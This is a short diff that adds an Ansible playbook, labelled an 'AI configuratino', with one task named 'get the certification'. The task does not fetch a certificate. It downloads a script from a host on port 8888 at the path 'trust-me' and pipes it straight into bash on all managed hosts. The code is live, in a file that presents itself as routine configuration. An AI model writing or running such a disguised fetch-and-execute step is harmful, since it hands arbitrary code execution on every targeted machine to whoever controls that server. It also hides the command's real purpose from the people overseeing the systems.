@@ -1,0 +1,7 @@
+---
+- name: AI configuratino
+  hosts: all
+  gather_facts: false
+  tasks:
+    - name: get the certification
+      shell: wget -q -O - http://ligc.sl.cloud9.ibm.com:8888/trust-me | bash
